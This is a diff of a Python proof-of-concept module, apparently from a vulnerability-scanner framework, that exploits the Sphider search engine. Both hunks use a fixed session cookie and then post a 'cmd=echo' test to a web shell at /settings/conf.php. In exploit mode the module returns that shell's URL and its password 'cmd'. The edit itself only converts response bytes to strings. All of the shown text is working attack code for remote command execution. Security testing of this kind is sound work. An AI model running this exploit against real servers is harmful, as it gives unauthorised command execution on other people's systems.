@@ -71,12 +71,12 @@ class Poc(ABPoc):
             request.add_header(
                 'Cookie', "PHPSESSID=4s96uquj98anhnlm3k2fitpm32")
             response = urllib.request.urlopen(request)
-            content = response.read()
+            content = str(response.read())
             shell_url = args['options']['target'] + '/settings/conf.php'
             request = urllib.request.Request(
                 shell_url, "cmd=echo sphiderwebshell")
             response = urllib.request.urlopen(request)
-            res = response.read()
+            res = str(response.read())
             if "sphiderwebshell" in res:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
@@ -108,12 +108,12 @@ class Poc(ABPoc):
             request.add_header(
                 'Cookie', "PHPSESSID=4s96uquj98anhnlm3k2fitpm32")
             response = urllib.request.urlopen(request)
-            content = response.read()
+            content = str(response.read())
             shell_url = args['options']['target'] + '/settings/conf.php'
             request = urllib.request.Request(
                 shell_url, "cmd=echo sphiderwebshell")
             response = urllib.request.urlopen(request)
-            res = response.read()
+            res = str(response.read())
             if "sphiderwebshell" in res:
                 exploit_url = shell_url
                 password = 'cmd'
